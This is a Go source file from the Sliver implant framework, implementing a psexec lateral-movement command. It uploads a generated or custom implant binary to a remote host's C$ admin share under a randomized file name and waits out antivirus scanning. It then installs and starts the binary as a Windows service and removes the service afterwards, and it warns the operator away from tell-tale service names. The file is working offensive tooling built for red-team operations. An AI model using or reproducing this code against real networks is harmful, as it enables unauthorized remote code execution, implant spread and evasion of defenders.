package exec

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/bishopfox/sliver/client/command/generate"
	"github.com/bishopfox/sliver/client/command/settings"
	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/util"
	"github.com/bishopfox/sliver/util/encoders"
	"github.com/spf13/cobra"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/status"
	"google.golang.org/protobuf/proto"
)

// PsExecCmd - psexec command implementation.
func PsExecCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
	session := con.ActiveTarget.GetSessionInteractive()
	if session == nil {
		return
	}

	hostname := args[0]
	if hostname == "" {
		con.PrintErrorf("You need to provide a target host, see `help psexec` for examples")
		return
	}
	var serviceBinary []byte
	profile, _ := cmd.Flags().GetString("profile")
	serviceName, _ := cmd.Flags().GetString("service-name")
	serviceDesc, _ := cmd.Flags().GetString("service-description")
	binPath, _ := cmd.Flags().GetString("binpath")
	customExe, _ := cmd.Flags().GetString("custom-exe")
	uploadPath := fmt.Sprintf(`\\%s\%s`, hostname, strings.ReplaceAll(strings.ToLower(binPath), "c:", "C$"))

	if serviceName == "Sliver" || serviceDesc == "Sliver implant" {
		con.PrintWarnf("You're going to deploy the following service:\n- Name: %s\n- Description: %s\n", serviceName, serviceDesc)
		con.PrintWarnf("You might want to change that before going further...\n")
		if !settings.IsUserAnAdult(con) {
			return
		}
	}

	if customExe == "" {
		if profile == "" {
			con.PrintErrorf("You need to pass a profile name, see `help psexec` for more info\n")
			return
		}

		definition, legacyProfile, err := generate.GetProfileDefinitionOrLegacy(context.Background(), profile, con)
		if err != nil {
			con.PrintErrorf("Could not load profile %s: %v\n", profile, err)
			return
		}
		if !legacyProfile && definition.GetMigrationError() != "" {
			con.PrintErrorf("Profile %s cannot be used for PsExec: %s\n", profile, definition.GetMigrationError())
			return
		}
		if !legacyProfile && !psexecProfileArtifact(definition.GetFinalArtifact()) {
			con.PrintErrorf("PsExec requires a Windows service-executable/pe profile final artifact\n")
			return
		}
		serviceBinary, err = psexecProfileBinary(profile, definition, con)
		if err != nil {
			con.PrintErrorf("Could not generate profile %s: %v\n", profile, err)
			return
		}
	} else {
		// use a custom exe instead of generating a new Sliver
		fileBytes, err := os.ReadFile(customExe)
		if err != nil {
			con.PrintErrorf("Error reading custom executable '%s'\n", customExe)
			return
		}
		serviceBinary = fileBytes
	}

	filename := randomFileName()
	filePath := fmt.Sprintf("%s\\%s.exe", uploadPath, filename)
	uploadGzip, _ := new(encoders.Gzip).Encode(serviceBinary)
	// upload to remote target
	uploadCtrl := make(chan bool)
	con.SpinUntil("Uploading service binary ...", uploadCtrl)
	upload, err := con.Rpc.Upload(context.Background(), &sliverpb.UploadReq{
		Encoder: "gzip",
		Data:    uploadGzip,
		Path:    filePath,
		Request: con.ActiveTarget.Request(cmd),
	})
	uploadCtrl <- true
	<-uploadCtrl
	if err != nil {
		con.PrintErrorf("Error: %s\n", err)
		return
	}
	con.PrintInfof("Uploaded service binary to %s\n", upload.GetPath())
	con.PrintInfof("Waiting a bit for the file to be analyzed ...\n")
	// Looks like starting the service right away often fails
	// because a process is already using the binary.
	// I suspect that Defender on my lab is holding access
	// while scanning, which often resulted in an error.
	// Waiting 5 seconds seem to do the trick here.
	time.Sleep(5 * time.Second)
	// start service
	binaryPath := fmt.Sprintf(`%s\%s.exe`, binPath, filename)
	serviceCtrl := make(chan bool)
	con.SpinUntil("Starting service ...", serviceCtrl)
	start, err := con.Rpc.StartService(context.Background(), &sliverpb.StartServiceReq{
		BinPath:            binaryPath,
		Hostname:           hostname,
		Request:            con.ActiveTarget.Request(cmd),
		ServiceDescription: serviceDesc,
		ServiceName:        serviceName,
		Arguments:          "",
	})
	serviceCtrl <- true
	<-serviceCtrl
	if err != nil {
		con.PrintErrorf("Error: %v\n", err)
		return
	}
	if start.Response != nil && start.Response.Err != "" {
		con.PrintErrorf("Error: %s", start.Response.Err)
		return
	}
	con.PrintInfof("Successfully started service on %s (%s)\n", hostname, binaryPath)
	removeChan := make(chan bool)
	con.SpinUntil("Removing service ...", removeChan)
	removed, err := con.Rpc.RemoveService(context.Background(), &sliverpb.RemoveServiceReq{
		ServiceInfo: &sliverpb.ServiceInfoReq{
			Hostname:    hostname,
			ServiceName: serviceName,
		},
		Request: con.ActiveTarget.Request(cmd),
	})
	removeChan <- true
	<-removeChan
	if err != nil {
		con.PrintErrorf("Error: %s\n", err)
		return
	}
	if removed.Response != nil && removed.Response.Err != "" {
		con.PrintErrorf("Error: %s\n", removed.Response.Err)
		return
	}
	con.PrintInfof("Successfully removed service %s on %s\n", serviceName, hostname)
}

// psexecProfileBinary uses the legacy profile API only when the newer profile
// build RPC is unavailable for a migrated profile or on an older server.
func psexecProfileBinary(name string, definition *clientpb.BuildProfileDocument, con *console.SliverClient) ([]byte, error) {
	if definition != nil {
		generateCtrl := make(chan bool)
		con.SpinUntil(fmt.Sprintf("Generating service binary for %s\n", name), generateCtrl)
		record, file, err := generate.ExecuteProfile(context.Background(), &clientpb.BuildProfileExecuteRequest{Name: name}, con)
		generateCtrl <- true
		<-generateCtrl
		if err == nil {
			finalType := record.GetFinalArtifact().GetType()
			if file == nil || !psexecProfileArtifact(finalType) ||
				!proto.Equal(finalType, definition.GetFinalArtifact()) {
				return nil, fmt.Errorf("profile final artifact changed during service generation")
			}
			return file.Data, nil
		}
		if status.Code(err) != codes.Unimplemented || !definition.GetMigrated() || definition.GetMigrationError() != "" {
			return nil, err
		}
	}
	legacy := generate.GetImplantProfileByName(name, con)
	if legacy == nil {
		return nil, fmt.Errorf("profile %s not found", name)
	}
	return generate.GetSliverBinary(legacy, con)
}

func psexecProfileArtifact(artifact *clientpb.BuildArtifactType) bool {
	return artifact != nil && artifact.Kind == "service-executable" && artifact.Container == "pe" && artifact.GOOS == "windows" && artifact.GOARCH != ""
}

func randomString() string {
	alphanumeric := "abcdefghijklmnopqrstuvwxyz0123456789"
	str := ""
	for index := 0; index < util.Intn(8)+1; index++ {
		str += string(alphanumeric[util.Intn(len(alphanumeric))])
	}
	return str
}

func randomFileName() string {
	noun := randomString()
	noun = strings.ToLower(noun)
	switch util.Intn(3) {
	case 0:
		noun = strings.ToUpper(noun)
	case 1:
		noun = strings.ToTitle(noun)
	}

	separators := []string{"", "", "", "", "", ".", "-", "_", "--", "__"}
	sep := separators[util.Intn(len(separators))]

	alphanumeric := "abcdefghijklmnopqrstuvwxyz0123456789"
	prefix := ""
	for index := 0; index < util.Intn(3); index++ {
		prefix += string(alphanumeric[util.Intn(len(alphanumeric))])
	}
	suffix := ""
	for index := 0; index < util.Intn(6)+1; index++ {
		suffix += string(alphanumeric[util.Intn(len(alphanumeric))])
	}

	return fmt.Sprintf("%s%s%s%s%s", prefix, sep, noun, sep, suffix)
}
